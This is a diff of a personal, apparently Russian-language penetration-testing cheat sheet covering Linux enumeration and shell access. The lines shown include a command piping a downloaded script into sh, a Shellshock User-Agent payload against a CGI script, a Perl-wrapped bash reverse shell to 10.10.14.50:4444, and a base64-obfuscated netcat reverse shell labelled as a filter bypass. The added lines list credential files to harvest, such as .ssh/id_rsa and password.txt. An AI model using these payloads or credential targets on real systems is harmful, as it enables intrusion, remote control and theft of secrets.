@@ -36,25 +36,34 @@ wget https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh | sh
 
 # enumeration
 
-        дистрибутив;
-            cat /etc/issue
-           cat /etc/*-release
-       версия ядра и разрядность;
-                   cat /proc/version
-                 uname -a
-                  uname -mrs
-                    rpm -q kernel
-                   dmesg | grep Linux
-                    ls /boot | grep vmlinuz-
+дистрибутив;
 
-       сетевые интерфейсы, порты, службы;
-       netstat
-            
-       ss -tulpn
+        cat /etc/issue
+        cat /etc/*-release
 
-        процессы
+версия ядра и разрядность;
+       
+        cat /proc/version
+        uname -a
+
+сетевые интерфейсы, порты, службы;
+        
+        netstat
+        ss -tulpn
+
+процессы
         ps aux
         
+
+Файлы, которые стоит проверить
+
+/home/user/.bash_history
+/home/user/password.txt
+/home/user/.history
+/home/user/.mysql_history
+/home/user/.ssh/id_rsa
+
+
         
 curl -H "User-Agent: () { :;}; echo; /bin/sudo -l" http://10.8.0.10/cgi-bin/shell.sh
 
@@ -74,40 +83,19 @@ echo "system(\"bash -c 'bash -i >& /dev/tcp/10.10.14.50/4444 0>&1'\")" > file.pl
 
 echo bmMgMTkyLjE2OC41MC4xMjMgNDQ0NCAtZSAvYmluL2Jhc2gK | base64 -d | bash   (обход фильтрации)
 
-Sudo -l
-find hacker -exec whoami \;
-find / -perm -u=s -type f 2>/dev/null
+
+
 
 
 
 https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi
-
-https://gtfobins.github.io/  повышение привелегий через судо-приложения
-
-реверс
-https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#reverse-shell
-
-
-
-реверс генератор
 
 https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php   (Лучший PHP)
 
 https://www.revshells.com/
 
 
-
-
-Также вы можете загрузить zip-файл с RustHound https://github.com/OPENCYBER-FR/RustHound/archive/master.zip
-
-wget https://example.com/file.zip - стянуть файйл с сервера. У себя сервер - python3 -m http.server 8080
-
-
-Запустить интерактивную оболочку
-
-script /dev/null -c bash
-
-повысить до tty интелектуальной оболочки командой 
+# Повысить до tty интелектуальной оболочки командой 
 
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 
